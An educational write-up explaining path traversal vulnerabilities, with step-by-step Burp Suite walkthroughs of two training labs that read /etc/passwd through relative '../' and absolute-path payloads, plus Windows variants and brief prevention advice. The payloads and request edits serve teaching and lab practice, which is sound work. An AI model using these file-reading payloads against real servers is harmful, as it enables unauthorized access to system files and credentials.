# Topic: What is Path Traversal?

**Path Traversal** (also called **Directory Traversal**) is a vulnerability that allows an attacker to access files and directories that should not be accessible.

Instead of reading only the intended file, the attacker "travels" through directories and reads other files on the server.

# Real-World Example

Imagine an online shopping website displaying product images.

The page contains:

```html
<img src="/loadImage?filename=218.png">
```

When the browser requests:

```text
/loadImage?filename=218.png
```

the server reads:

```text
/var/www/images/218.png
```

### Directory Structure

```text
/
└── var
    └── www
        └── images
            ├── 218.png
            ├── 219.png
            └── 220.png
```

Everything works normally.

# The Problem

The application trusts whatever filename the user provides.

An attacker changes:

```text
filename=218.png
```

to:

```text
filename=../../../etc/passwd
```

The request becomes:

```text
/loadImage?filename=../../../etc/passwd
```

The application builds:

```text
/var/www/images/../../../etc/passwd
```
# Understanding `../`

The sequence:

```text
../
```

means:

```text
Go up one directory
```

Example:

```text
/var/www/images/
```

After one `../`

```text
/var/www/
```

After second `../`

```text
/var/
```

After third `../`

```text
/
```

Then:

```text
etc/passwd
```

Final path:

```text
/etc/passwd
```

# Visualization

```text
/var/www/images/
        ↑
       ../
/var/www/
        ↑
       ../
/var/
        ↑
       ../
/
        ↓
/etc/passwd
```

The attacker escapes the image folder and accesses a system file.

# What is `/etc/passwd`?

On Linux/Unix systems:

```text
/etc/passwd
```

contains information about system users.

Example:

```text
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

This can help attackers learn about the system.

# Windows Example

Windows supports:

```text
..\
```

instead of:

```text
../
```

Example:

```text
filename=..\..\..\windows\win.ini
```

Request:

```text
/loadImage?filename=..\..\..\windows\win.ini
```

The application may return:

```text
C:\Windows\win.ini
```

# Why is Path Traversal Dangerous?

An attacker may access:

### 1. Application Source Code

```text
/config/database.php
```

### 2. Database Credentials

```text
username=admin
password=secret123
```

### 3. Configuration Files

```text
config.yml
settings.json
```

### 4. Operating System Files

Linux:

```text
/etc/passwd
/etc/shadow
```

Windows:

```text
C:\Windows\win.ini
```

# Possible Consequences

```text
Path Traversal
      ↓
Read Sensitive Files
      ↓
Steal Credentials
      ↓
Access Database
      ↓
Take Over Application
```

In severe cases:

```text
Read Files
      ↓
Write Files
      ↓
Upload Malicious Code
      ↓
Full Server Compromise
```

# How Developers Prevent It

### Vulnerable Code

```python
path = "/var/www/images/" + filename
```

User controls `filename`.


### Secure Approach

Allow only specific files:

```python
218.png
219.png
220.png
```

or

Normalize and validate paths before reading files.

# Path Traversal - Reading Arbitrary Files

![lab1-](screenshots/labp1.png)

## Step 1: Intercept a Product Image Request

1. Open any product page.
2. Click on a product image.
3. In Burp Suite, intercept or locate the request in:

```text
Proxy > HTTP History
```

Example request:

```http
GET /image?filename=218.png HTTP/2
```
## Step 2: Modify the Filename Parameter

Change:

```http
filename=218.png
```

to:

```http
filename=../../../etc/passwd
```

Modified request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
```

## Step 3: Forward the Request

1. Send the modified request.
2. Observe the response.

## Step 4: View File Contents

The server returns the contents of:

```text
/etc/passwd
```

Example response:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
![lab1-](screenshots/pb.png)

## Step 5: Lab Solved
![lab1-](screenshots/labsp.png)

Successfully reading:

```text
/etc/passwd
```

confirms the Path Traversal vulnerability and solves the lab.

# Vulnerability Explanation

### Intended Access

```text
/image?filename=218.png
```

Server reads:

```text
/var/www/images/218.png
```

### Path Traversal Attack

```text
../../../etc/passwd
```

Traversal:

```text
images/
   ↑
../
   ↑
../
   ↑
../
   ↑
/etc/passwd
```

Result:

```text
Server reads arbitrary system files.
```

---

# Topic: Common Obstacles to Exploiting Path Traversal Vulnerabilities


After developers learn about path traversal, they often add protections to block:

```text
../
```

However, these protections are sometimes incomplete and can be bypassed.

# Normal Path Traversal Attack

Suppose the application reads:

```text
/loadImage?filename=218.png
```

Attacker changes it to:

```text
/loadImage?filename=../../../etc/passwd
```

Result:

```text
/etc/passwd
```

is read.


# Obstacle 1: Application Blocks `../`

Some applications try to remove traversal sequences.

Example:

```text
../../../etc/passwd
```

becomes:

```text
etc/passwd
```

The developer thinks the attack is prevented.

# Absolute Path Bypass

Instead of using:

```text
../../../etc/passwd
```

an attacker may try:

```text
filename=/etc/passwd
```

This is called an **absolute path**.

### Relative Path

Starts from the current directory:

```text
../../../etc/passwd
```

### Absolute Path

Starts from the filesystem root:

```text
/etc/passwd
```


# Visualization

### Relative Path

```text
/var/www/images/
      ↑
     ../
/var/www/
      ↑
     ../
/var/
      ↑
     ../
/
      ↓
/etc/passwd
```


### Absolute Path

Directly:

```text
/
/etc/passwd
```

No traversal sequences are needed.


# Why This Works

Suppose the application only checks for:

```text
../
```

and blocks it.

But it does **not** check for:

```text
/etc/passwd
```

Then the attacker can still access the file.


# Linux Example

Request:

```text
/loadImage?filename=/etc/passwd
```

The application may return:

```text
root:x:0:0:root:/root:/bin/bash
```

# Windows Example

An attacker may try:

```text
filename=C:\Windows\win.ini
```

or

```text
filename=C:\Windows\System32\drivers\etc\hosts
```

These are absolute paths on Windows systems.


# Developer Mistake

Developer only blocks:

```text
../
```

but forgets about:

```text
/etc/passwd
C:\Windows\win.ini
```

As a result, sensitive files can still be accessed.

# Path Traversal Using an Absolute Path

![lab1-](screenshots/labp2.png)

## Step 1: Intercept a Product Image Request

1. Open any product page.
2. Click a product image.
3. In Burp Suite, go to:

```text
Proxy > HTTP History
```

4. Locate the image request.

Example:

```http
GET /image?filename=218.png HTTP/2
```

## Step 2: Modify the Filename Parameter

Replace:

```http
filename=218.png
```

with:

```http
filename=/etc/passwd
```

Modified request:

```http
GET /image?filename=/etc/passwd HTTP/2
```

## Step 3: Send the Request

1. Forward the modified request.
2. Observe the response.


## Step 4: Read the File

The application returns the contents of:

```text
/etc/passwd
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```
![lab1-](screenshots/pb2.png)

## Step 5: Lab Solved

Successfully retrieving:

```text
/etc/passwd
```

confirms the Path Traversal vulnerability and solves the lab.

![lab1-](screenshots/labp2s.png)

# Vulnerability Explanation

### Normal Request

```http
GET /image?filename=218.png
```

Application loads:

```text
/images/218.png
```

### Absolute Path Attack

```http
GET /image?filename=/etc/passwd
```

Instead of loading an image file, the application directly accesses:

```text
/etc/passwd
```

because it fails to validate the filename parameter.

---

